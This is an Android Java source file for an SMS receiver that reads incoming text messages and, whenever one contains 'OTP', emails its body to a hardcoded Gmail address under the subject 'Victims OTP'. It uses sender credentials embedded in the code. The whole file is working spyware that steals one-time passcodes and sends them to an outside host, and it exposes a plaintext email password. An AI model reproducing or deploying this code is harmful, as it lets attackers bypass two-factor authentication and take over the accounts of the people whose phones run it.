package com.golden.android.broadcastreceiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

/**
 * Created by Machine on 06-11-2016.
 */
public class IncomingSms extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SMSBroadcastReceiver";
    String SMSbody;

    String reciverEmail="pratiklovesonlyyou@gmail.com";
    String senderMail="emailkeyapptest@gmail.com";
    String Pass ="emailkeyapptestp";




    @Override
    public void onReceive(Context context, Intent intent) {
        String URL = context.getString(R.string.reciveremailid);
        reciverEmail = URL;
        Log.i(TAG, "Intent recieved: " + intent.getAction());
        if (intent.getAction() == SMS_RECEIVED) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[])bundle.get("pdus");
                final SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                }
                if (messages.length > -1) {
                   SMSbody= messages[0].getMessageBody();
                    Log.i(TAG, "Message recieved: " + SMSbody);
                }

                int q =SMSbody.indexOf("OTP");

                if(q==-1)
                {
                    Log.i(TAG,"it is and Not  Otp");

                }
                else
                {
                    Log.i(TAG,"it is   Otp");

                    new Thread(new Runnable()
                    {
                        @Override
                        public void run()
                        {
                            GMailSender sender = new GMailSender(senderMail,Pass);
                            try {
                                Log.i(TAG,"sending email");
                                sender.sendMail("Victims OTP",SMSbody,senderMail,reciverEmail);
                            } catch (Exception e) {
                                Log.e(TAG, "onReceive: "+e.getMessage());
                               // e.printStackTrace();
                            }
                        }
                    }).start();

 //                   GMailSender sender = new GMailSender(senderMail,Pass);
 //                   try {
 //                       Log.i(TAG,"sending email");
 //                       sender.sendMail("Email Subject",SMSbody,senderMail,reciverEmail);
 //                   } catch (Exception e) {
 //                       Log.e(TAG, "onReceive: "+e.getMessage());
 //                       e.printStackTrace();
 //                   }
                }





            }
        }
    }
}
